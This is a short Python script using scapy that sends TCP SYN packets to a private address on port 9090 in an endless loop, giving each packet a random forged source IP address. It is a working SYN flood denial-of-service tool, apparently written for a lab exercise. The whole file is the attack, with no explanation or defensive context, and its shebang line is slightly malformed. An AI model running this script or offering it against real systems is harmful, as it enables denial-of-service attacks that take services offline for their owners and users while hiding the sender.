#!usr/bin/python3
from scapy.all import IP,TCP,send
from ipaddress import IPv4Address
from random import getrandbits

b = IP(dst="192.168.43.246")
c = TCP(sport=9090,dport=9090,seq=1551,flags='S')
pkt = b/c

while True:
      pkt[IP].src = str(IPv4Address(getrandbits(32)))
      send(pkt,verbose=0)
